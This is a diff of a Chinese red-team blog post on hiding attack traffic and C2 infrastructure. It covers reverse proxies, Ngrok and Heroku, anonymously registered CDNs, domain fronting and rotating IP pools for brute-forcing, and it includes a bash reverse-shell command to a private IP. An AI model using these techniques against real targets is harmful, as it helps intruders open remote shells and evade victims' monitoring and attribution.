@@ -105,15 +105,15 @@
 
 
 
-<meta name="description" content="流量隐匿 &amp;ensp;&amp;ensp;这是贯穿红队与渗透的一个核心技术，可惜的是很多情况下不会产生经济效益，但它是一门很cool的技术，也是每一个极客们赖以存活的技术，当你凝视深渊，深渊也在凝视你。下面的一些技术和内容会有重合，因为隐匿的本质都是流量与协议。隐匿的内容很多，包括免杀的隐匿，文件隐藏等，篇幅过多后续单独写，本文只针对流量与协议的隐匿。">
+<meta name="description" content="流量隐匿 &amp;ensp;&amp;ensp;这是贯穿红队与渗透的一个核心技术，可惜的是很多情况下不会产生经济效益，但它是一门很cool的技术，也是每一个极客们赖以存活的技术，当你凝视深渊，深渊也在凝视你。下面的一些技术和内容会有重合，因为隐匿的本质都是流量与协议。隐匿的内容很多，包括免杀的隐匿，文件隐藏等，篇幅过多后续单独写，本文只针对流量与C2的隐匿。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="流量隐匿">
 <meta property="og:url" content="http://sunyyer.com/2021/10/08/%E6%B5%81%E9%87%8F%E9%9A%90%E5%8C%BF/index.html">
 <meta property="og:site_name" content="云">
-<meta property="og:description" content="流量隐匿 &amp;ensp;&amp;ensp;这是贯穿红队与渗透的一个核心技术，可惜的是很多情况下不会产生经济效益，但它是一门很cool的技术，也是每一个极客们赖以存活的技术，当你凝视深渊，深渊也在凝视你。下面的一些技术和内容会有重合，因为隐匿的本质都是流量与协议。隐匿的内容很多，包括免杀的隐匿，文件隐藏等，篇幅过多后续单独写，本文只针对流量与协议的隐匿。">
+<meta property="og:description" content="流量隐匿 &amp;ensp;&amp;ensp;这是贯穿红队与渗透的一个核心技术，可惜的是很多情况下不会产生经济效益，但它是一门很cool的技术，也是每一个极客们赖以存活的技术，当你凝视深渊，深渊也在凝视你。下面的一些技术和内容会有重合，因为隐匿的本质都是流量与协议。隐匿的内容很多，包括免杀的隐匿，文件隐藏等，篇幅过多后续单独写，本文只针对流量与C2的隐匿。">
 <meta property="og:locale">
 <meta property="article:published_time" content="2021-10-08T04:11:11.000Z">
-<meta property="article:modified_time" content="2021-11-03T15:50:22.054Z">
+<meta property="article:modified_time" content="2021-11-13T11:43:59.272Z">
 <meta property="article:author" content="sunyyer">
 <meta property="article:tag" content="工具">
 <meta property="article:tag" content="Red Team">
@@ -396,21 +396,37 @@
 
       
         <h1 id="流量隐匿"><a href="#流量隐匿" class="headerlink" title="流量隐匿"></a>流量隐匿</h1><blockquote>
-<p>&ensp;&ensp;这是贯穿红队与渗透的一个核心技术，可惜的是很多情况下不会产生经济效益，但它是一门很cool的技术，也是每一个极客们赖以存活的技术，<em>当你凝视深渊，深渊也在凝视你</em>。下面的一些技术和内容会有重合，因为隐匿的本质都是流量与协议。隐匿的内容很多，包括免杀的隐匿，文件隐藏等，篇幅过多后续单独写，本文只针对流量与协议的隐匿。</p>
+<p>&ensp;&ensp;这是贯穿红队与渗透的一个核心技术，可惜的是很多情况下不会产生经济效益，但它是一门很cool的技术，也是每一个极客们赖以存活的技术，<em>当你凝视深渊，深渊也在凝视你</em>。下面的一些技术和内容会有重合，因为隐匿的本质都是流量与协议。隐匿的内容很多，包括免杀的隐匿，文件隐藏等，篇幅过多后续单独写，本文只针对流量与C2的隐匿。</p>
 </blockquote>
 <hr>
 <span id="more"></span>
-<h2 id="流量代理"><a href="#流量代理" class="headerlink" title="流量代理"></a>流量代理</h2><p>&ensp;&ensp;流量代理会贯穿整个渗透与攻击过程，不妨把思维往大拓展，除了在进入的过程中通过协议流量外，回连、内网穿透等所有传递流量的过程中都会需要对流量进行混淆。代理工具有很多，reGeorg\Tunnel\FRP这些工具可以尝试在没有杀软和态势感知的环境下使用，如果在做敏感环境下的渗透时，建议使用系统自有的一些工具进行流量代理，这样的好处是可以规避杀软与监测，坏处是使用会比较繁琐，考验细心与耐心。</p>
+
+<h2 id="流量代理"><a href="#流量代理" class="headerlink" title="流量代理"></a>流量代理</h2><p>&ensp;&ensp;流量代理会贯穿整个渗透与攻击过程，不妨把思维往大拓展，除了在进入的过程中通过协议流量外，回连、内网穿透等所有传递流量的过程中都会需要对流量进行混淆。代理工具有很多，reGeorg\Tunnel\FRP这些工具可以尝试在没有杀软和态势感知的环境下使用，如果在做敏感环境下的渗透时，建议使用系统自有的一些工具进行流量代理，这样的好处是可以规避杀软与监测，坏处是使用会比较繁琐，考验细心与耐心。流量代理总的来说共分为三类，分别是：透明代理，正向代理与反向代理。</p>
+<h3 id="SSH隧道隐匿"><a href="#SSH隧道隐匿" class="headerlink" title="SSH隧道隐匿"></a>SSH隧道隐匿</h3><h3 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h3><p>###正反向代理</p>
+<p>&ensp;&ensp; 这里开始详细说说正向代理与反向代理二者的意义，代理的核心思路就是部署在Client与Server端中间的一层服务，无论名称与结构发生何种变化，但是物理拓扑决定了其根本意义；正向代理就是Client在发送了流量后，通过这个代理做为实际上网络的真正出口点，相当于另一种意义上的NAT，但是只是应用层的套壳。反向代理则是Server端流量请求接收后回应的一个出口（对于Client来说是回应的入口），当然这儿的出口只是一次逻辑中的出口，反过来也可以叫做入口。对象不同会造成汉语的解释不同。如果我们针对隐匿中的回连来说，我们就相当于一个Server,当Client回连时，就可以利用反向代理，做一个出口，对我们来说是入口，对于Client来说是正向代理，是出口。这样的好处就是开放到互联网的接口是开放的，在出口接上一台Heroku，那么流量会在出口处变成Heroku的信息，Heroku对互联网是开放的，这一端无法溯源，Client端只能溯源到Heroku的节点。</p>
+<p>&ensp;&ensp; 正向代理的典型用途就是在防火墙内的局域网客户端提供访问互联网的途径。反向代理的典型用途是将防火墙后面的服务提供给互联网用户访问。</p>
+<h3 id="内网穿透隐匿之Ngrok与sunny"><a href="#内网穿透隐匿之Ngrok与sunny" class="headerlink" title="内网穿透隐匿之Ngrok与sunny"></a>内网穿透隐匿之Ngrok与sunny</h3><p>&ensp;&ensp; 如果理解了正反向和含义，就会发现现在只需要一个代理服务器，就可以实现最基本的隐匿行为，这种方式很类似与我们翻墙使用的各种VPN，当我们访问国外的一些服务器时，对于国外的服务器来说，它们看到的IP绝不会是来自中国的IP，而是各种架设在香港，亚马逊，等各个地方的节点IP。现在需要做的事情就是把这套逻辑反过来，那么就是Ngrok与sunny的作用了，它们可以将内网地址转发到外网，转发的外网地址也就是这些服务商的节点地址，也就完成了流量端的基本隐匿。这也是逻辑上的一种反向代理。</p>
 <ul>
-<li>SSH隧道隐匿</li>
-<li>Nginx反向代理<ul>
-<li>Ngrok与Heroku</li>
-</ul>
-</li>
 <li>Windows netsh</li>
 <li>iptables</li>
 </ul>
-<h2 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a>肉鸡</h2><h2 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h2><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><h2 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h2><h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><ul>
+<h2 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a>肉鸡</h2><h2 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h2><p>&ensp;&ensp; 顾名思义就是建立在云端的，只需要写函数就可以运行代码的服务器，</p>
+<h2 id="Heroku"><a href="#Heroku" class="headerlink" title="Heroku"></a>Heroku</h2><p>&ensp;&ensp;这里我们用Heroku来实现隐匿。Heroku相当于可以免费部署容器并开放web服务到互联网，因为云平台自身的匿名信，所以当使用Nginx反向代理到真实的服务器后，流量会最终显示为云平台的IP，域名会得到一个Heroku的域名。</p>
+<p>&ensp;&ensp;整个流程可以看到技术根源就是反向代理，利用Heroku的匿名性和已有的HTTPS证书，完成隐匿。优点就是操作简单，可以看到不需要VPS，不需要DNS，因为它本身就相当于一台VPS，这里和自己搭一台VPS匿名的主机效果是一样的，搭建过程甚至不需要太多的配置。当然缺点就是不稳定，网络延迟很高，现在需要收费。</p>
+<h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>&ensp;&ensp;CND因为其特性所以可以用于隐藏C2地址和流量，比较遗憾的是这些技术无法从源头上将IP混淆或者隐藏，因为它利用的机制核心在于让CDN转发合法的流量，而使用CDN就必须要使用应用会话层的内容，DNS,域名等，所以这些方法可以用以实现在应用的隐匿。大致有以下几步：</p>
+<ol>
+<li>匿名购买域名，通过<a target="_blank" rel="noopener" href="https://www.freenom.com/">freenom</a>免费购买</li>
+<li>购买CDN服务，利用匿名邮箱注册<a target="_blank" rel="noopener" href="https://www.cloudfare.com/">cloudfare</a></li>
+<li>在域名服务商处添加CND的基本信息</li>
+<li>然后在CDN服务商添加DNS的A解析，指向VPS的IP</li>
+</ol>
+<p>&ensp;&ensp;这样做完流量中受害方域名会显示为我们免费注册的域名，IP为CDN节点的IP</p>
+<h2 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h2><p>&ensp;&ensp;这里不讲一些基本的协议原理内容，因为低层的内容并不是我们关心，具体可以看这篇文章<a target="_blank" rel="noopener" href="https://xlab.tencent.com/cn/2021/05/14/domain-borrowing/">玄武实验室</a>。大致就是同一IP在CDN这里有很多不同的域名，那如果把host内容从高信誉的domain换成我们注册的domain呢？其实浅层原理就这么简单，http是明文被看到的，所以我们要用https。域前置和CDN技术实现的内容重合，也需要CDN的技术，但有不同的地方在于：域前置生成后的域名可以绑定一些高信任值的域名，流量中也会变为高信任域名和IP，仅用于HTTPS，它比CDN多的几个技术点有这些：</p>
+<ol>
+<li>在做完CDN的配置后，需要知道CDN上其他高信誉域名或IP，在云服务厂商的加速CDN里会有一栏让你填写加速域名，这时就可以把高信誉的域名添加进去</li>
+<li>在C2控制端我们需要修改header头来实现domain伪造，CS会比较简单。<h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2></li>
+</ol>
+<ul>
 <li>日志信息隐匿<ul>
 <li>ssh幽灵登录</li>
 </ul>
@@ -426,7 +442,12 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.0.100/2333 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
 <p>&ensp;&ensp;在两条反弹命令在使用时，基本上无法被单独监测到，而是会报隐蔽隧道的告警，基本上没有人会关心这样的告警。不过可惜的是，这样还是会把真实IP暴露出来，所以还是需要通过反向代理的方式去隐藏真实IP。</p>
-
+<h1 id="随机地址池隐匿"><a href="#随机地址池隐匿" class="headerlink" title="随机地址池隐匿"></a>随机地址池隐匿</h1><blockquote>
+<p>这是另一种隐匿的思维方法，如果流量隐匿相当与隐藏自己，那么使用随机地址池就可以实现对目标的降维打击，一般在需要长时间爆破或者渗透测试时使用，方式代理IP被封掉。</p>
+</blockquote>
+<h2 id="隐匿思考"><a href="#隐匿思考" class="headerlink" title="隐匿思考"></a>隐匿思考</h2><p>&ensp;&ensp; 该思维逻辑的核心在于前提，也就是代理是否能够真实隐藏IP，从服务端来说，完全匿名的代理IP是无法被溯源的，一段完整的加密报文中不会出现你IP存在，代理的协议也很多，包括TCP代理，http/https代理，socks5代理等，那么思维再开放一些，如果从第三方看呢？无疑是肯定的，在ISP的监管下，你的IP是裸露的。所以我们需要更骚的操作来实现对第三方的隐匿，具体参考后续文章。OK，现在来详细从匿名性来说说这几种代理。</p>
+<h2 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h2><p>&ensp;&ensp; 在透明代理下，抱头会有一个标签叫http_x_forwarded_for,这个标签会将你的真实IP显示出来，一般浏览器的代理就是这种模式。</p>
+<h2 id="匿名代理"><a href="#匿名代理" class="headerlink" title="匿名代理"></a>匿名代理</h2><h2 id="高匿代理"><a href="#高匿代理" class="headerlink" title="高匿代理"></a>高匿代理</h2><h2 id="混淆代理"><a href="#混淆代理" class="headerlink" title="混淆代理"></a>混淆代理</h2>
       
     </div>
     
@@ -620,7 +641,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E9%9A%90%E5%8C%BF"><span class="nav-number">1.</span> <span class="nav-text">流量隐匿</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">流量代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%82%89%E9%B8%A1"><span class="nav-number">1.2.</span> <span class="nav-text">肉鸡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%91%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">云函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VPN"><span class="nav-number">1.4.</span> <span class="nav-text">VPN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%89%8D%E7%BD%AE"><span class="nav-number">1.5.</span> <span class="nav-text">域前置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"><span class="nav-number">1.6.</span> <span class="nav-text">基础设施</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E9%9A%90%E5%8C%BF"><span class="nav-number">1.</span> <span class="nav-text">流量隐匿</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">流量代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH%E9%9A%A7%E9%81%93%E9%9A%90%E5%8C%BF"><span class="nav-number">1.1.1.</span> <span class="nav-text">SSH隧道隐匿</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="nav-number">1.1.2.</span> <span class="nav-text">Nginx反向代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E9%9A%90%E5%8C%BF%E4%B9%8BNgrok%E4%B8%8Esunny"><span class="nav-number">1.1.3.</span> <span class="nav-text">内网穿透隐匿之Ngrok与sunny</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%82%89%E9%B8%A1"><span class="nav-number">1.2.</span> <span class="nav-text">肉鸡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%91%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">云函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Heroku"><span class="nav-number">1.4.</span> <span class="nav-text">Heroku</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VPN"><span class="nav-number">1.5.</span> <span class="nav-text">VPN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CDN"><span class="nav-number">1.6.</span> <span class="nav-text">CDN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%89%8D%E7%BD%AE"><span class="nav-number">1.7.</span> <span class="nav-text">域前置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"><span class="nav-number">1.8.</span> <span class="nav-text">基础设施</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9A%8F%E6%9C%BA%E5%9C%B0%E5%9D%80%E6%B1%A0%E9%9A%90%E5%8C%BF"><span class="nav-number">2.</span> <span class="nav-text">随机地址池隐匿</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9A%90%E5%8C%BF%E6%80%9D%E8%80%83"><span class="nav-number">2.1.</span> <span class="nav-text">隐匿思考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86"><span class="nav-number">2.2.</span> <span class="nav-text">透明代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8C%BF%E5%90%8D%E4%BB%A3%E7%90%86"><span class="nav-number">2.3.</span> <span class="nav-text">匿名代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E5%8C%BF%E4%BB%A3%E7%90%86"><span class="nav-number">2.4.</span> <span class="nav-text">高匿代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%B7%E6%B7%86%E4%BB%A3%E7%90%86"><span class="nav-number">2.5.</span> <span class="nav-text">混淆代理</span></a></li></ol></li></ol></div>
             
 
           </div>
